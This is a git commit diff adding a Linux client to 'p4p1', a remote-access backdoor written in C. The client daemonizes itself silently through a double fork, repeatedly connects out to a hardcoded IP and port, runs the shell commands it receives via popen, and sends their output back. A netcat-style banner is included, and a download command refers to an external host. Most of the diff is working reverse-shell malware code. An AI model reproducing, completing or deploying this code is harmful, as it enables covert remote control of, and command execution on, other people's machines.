9bc1b99105732bd896164e55fead83c22b215de7
Leo Smith <k0oo@icloud.com>
2016-07-25 13:51:35 +0200

    updated
    added linux client and patched server bugs

--- p4p1-h_linux.h
+++ p4p1-h_linux.h
@@ -20,4 +20,76 @@
 #define BUFSIZE 9999
 #define str(a) #a
 #define xstr(a) str(a)
-#define SOCKET_ERROR 0
+#define SOCKET_ERR -1
+
+/*
+ * get buf and check if p4p1 custom command
+ */
+int iscommand(char buf)
+{
+	if(buf == '*'){
+		return 1;
+	} else if(buf == '&') {
+		return 2;
+	} else {
+		return 0;
+	}
+}
+
+int download()
+{
+	return 0;
+}
+
+static void skeleton_daemon()
+{
+    pid_t pid;
+
+    /* Fork off the parent process */
+    pid = fork();
+
+    /* An error occurred */
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    /* Success: Let the parent terminate */
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* On success: The child process becomes session leader */
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    /* Catch, ignore and handle signals */
+    //TODO: Implement a working signal handler */
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    /* Fork off for the second time*/
+    pid = fork();
+
+    /* An error occurred */
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    /* Success: Let the parent terminate */
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* Set new file permissions */
+    umask(0);
+
+    /* Change the working directory to the root directory */
+    /* or another appropriated directory */
+    chdir("/");
+
+    /* Close all open file descriptors */
+    int x;
+    for (x = sysconf(_SC_OPEN_MAX); x>0; x--)
+    {
+        close (x);
+    }
+
+    /* Open the log file */
+    //openlog ("firstdaemon", LOG_PID, LOG_DAEMON);
+}
--- p4p1-o_linux.c
+++ p4p1-o_linux.c
@@ -2,69 +2,145 @@
 
 int main(int argc, char *argv[])
 {
-  if(argc == 1){
-    //invisible mode
-    printf("invis mode on!");
-  }
+	if(argc <= 1){
+		skeleton_daemon();
+	}
 
-  int portno;
-  char portchar[6];
-  FILE *fp = fopen("port.cfg", "r");
+	int portno;
+	char portchar[6];
+	FILE *fp = fopen("port.cfg", "r");
 
-  if(fp == NULL){
-    portno = 4441;
-  } else {
-    int i = 0;
-    char c;
+  	if(fp == NULL){
+    		portno = 4441;
+  	} else {
+    		int i = 0;
+    		char c;
 
-    while((c = fgetc(fp)) != EOF){
-      portchar[i] = c;
-      i++;
-    }
-    portchar[i+1] = '\0';
+    		while((c = fgetc(fp)) != EOF){
+      			portchar[i] = c;
+      			i++;
+		}
+    		portchar[i+1] = '\0';
 
-    portno = atoi(portchar);
+    		portno = atoi(portchar);
+  	}
 
-    fclose(fp);
-  }
+  	while(1) {
 
-
-  while(1){
-
-    int bytesSent, bytesRecv, cn;
-    struct sockaddr_in server, client;
-    char sessionID[5] = "";					// Session id given by serv
+		FILE * pPipe;
+    		int bytesSent, bytesRecv, cn;
+    		struct sockaddr_in server, client;
+    		char sessionID[5] = "";					// Session id given by serv
 		char buf[BUFSIZE] = "";					//buf
-    char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id
+    		char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id
 		char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";
 
-    client.sin_family = AF_INET;
-    client.sin_port = htons(portno);
-    client.sin_addr.s_addr = inet_addr(xstr(86.247.205.102));	//this should not be hard coded.
+    		client.sin_family = AF_INET;
+    		client.sin_port = htons(portno);
+    		server.sin_addr.s_addr = inet_addr("192.168.1.21");
 
-    int * pbs = &bytesSent;
-    int *pbr = &bytesRecv;
+    		int *pbs = &bytesSent;
+    		int *pbr = &bytesRecv;
 
-    //Start up socket and try connecting.
-    int s = socket(AF_INET, SOCK_STREAM, 0);
-    if(s == -1){
-      break;
-    }
+    		//Start up socket and try connecting.
+    		int s = socket(AF_INET, SOCK_STREAM, 0);
+    		if(s == -1){
+      			//break;
+    		}
 
-    do{
-      cn = connect(s, &client, sizeof(client));
-    } while(cn == SOCKET_ERROR);
+    		do{
+			if(connect(s, (struct sockaddr *)&client, sizeof(client)) < 0){
+				cn = SOCKET_ERR;
+			}
+    		} while(cn == SOCKET_ERR);
 
-    if(cn != SOCKET_ERROR){
-      printf("session id\n");
-    }
+    		if(cn != SOCKET_ERR){
+			*pbr = SOCKET_ERR;
+			//Receive the session id
 
-    while(cn != SOCKET_ERROR){
-      printf("main loop\n");
-    }
+	    		while(*pbr == SOCKET_ERR){
+				*pbr = recv(s, buf, BUFSIZE, 0);
+					if(*pbr == 0){
+						break;
+					}
 
-    close: //ending label
-  }
+					if(bytesRecv < 0){
+						return -1;
+					} else {
+						sessionID[0] = buf[0];
+						printf("sid = %c", sessionID[0]);
+						bzero(buf, BUFSIZE);
+					}
+			}
+			// Send ui if no session id
+			if(sessionID[0] == '0'){	//if session id is 0 that means you are working with nc
+				*pbs = send(s, ui, sizeof(ui), 0);
+			}
+    		}
+
+    		while(cn != SOCKET_ERR){
+			if(sessionID[0] == '0'){
+				*pbs = send(s, prompt, sizeof(prompt), 0);
+			}
+
+			*pbr = SOCKET_ERR;
+
+			while(*pbr == SOCKET_ERR){
+				*pbr = recv(s, buf, BUFSIZE, 0);
+				if(*pbr == 0){
+					break;
+				}
+
+				if(bytesRecv < 0){
+					return -1;
+				} else {
+					/*process received data*/
+					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){
+
+						if(iscommand(buf[0]) == 2){	// exit command
+							bzero(buf, BUFSIZE);
+							goto close;
+						} else if (iscommand(buf[0]) == 1) { //file download command
+							bzero(buf, BUFSIZE);
+							download();
+							strcpy(buf, "file downloaded from p4p1server.hopto.org\n");
+						} else {
+							bzero(buf, BUFSIZE);
+						}
+
+					} else {
+						if( (pPipe = popen( buf, "r" )) == NULL ){
+							bzero(buf, BUFSIZE);
+							strcpy(buf, "error in command");
+							printf("error in cmd\n");
+						} else {
+							bzero(buf, BUFSIZE);
+							int i = 0;
+							char ch;
+							while((ch = fgetc(pPipe)) != EOF){
+								buf[i] = ch;
+								i++;
+								if(i == BUFSIZE){
+									break;
+								}
+							}
+						}
+					}
+				}
+			}
+
+			/*
+			 * Send back output
+			 **/
+			*pbs = send(s, buf, BUFSIZE, 0);
+			bzero(buf, BUFSIZE);
+
+    		}// end cn while loop
+
+    		close:do{ int i = 1+1; }while(1==0); //ending label
+		pclose(pPipe);
+		close(s);
+  	}
 
   return 0;
 }
